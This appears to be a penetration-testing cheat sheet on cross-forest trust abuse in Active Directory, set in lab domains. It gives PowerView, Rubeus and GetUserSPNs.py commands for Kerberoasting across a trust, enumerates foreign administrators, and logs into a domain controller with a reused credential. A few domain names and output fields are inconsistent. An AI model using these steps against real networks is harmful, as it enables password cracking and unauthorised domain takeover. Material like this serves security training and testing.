# Cross-Forest Trust Abuse

Kerberoasting and ASREPRoasting can be performed across trusts, depending on its direction. **In a domain with either inbound or bidirectional domain/forest trust we can perform various attacks.** Like obtaining a Kerberos ticket and cracking the hash.

#### Enumerate accounts for SPNs

```powershell
# Find users
Get-DomainUser -SPN -Domain ZENCORP.LOCAL | select SamAccountName

# Check group memberships
Get-DomainUser -Domain ZENCORP.LOCAL -Identity mssqlsvc |select samaccountname,memberof

# Kerberoast
.\Rubeus.exe kerberoast /domain:ZENCORP.LOCAL /user:mssqlsvc /nowrap
```

Or from Linux

```bash
GetUserSPNs.py -request -target-domain MACDOMAIN.LOCAL ZENORP.LOCAL/wley  
```

### <mark style="color:yellow;">Admin Password Re-Use & Group Membership</mark>

Sometimes usernames that we find in domain A and domain B its possible that they have the same password. Also taking over Admins in domain  A that have membership in domain B which would give access to domain B as well.

Here we se Administrator of ZENCORP have also Administrator account for MACDOMAIN.&#x20;

```powershell
Get-DomainForeignGroupMember -Domain ZENCORP.LOCAL

GroupDomain             : ZENCORP.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=ZENCORP,DC=LOCAL
MemberDomain            : ZENCORP.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=ZENORP,DC=LOCAL

PS C:\zen> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

MACDOMAIN\administrator
```

Based on that membership we gain access

```powershell
Enter-PSSession -ComputerName DC01.ZENCORP.LOCAL -Credential MACDOMAIN\administrator
```

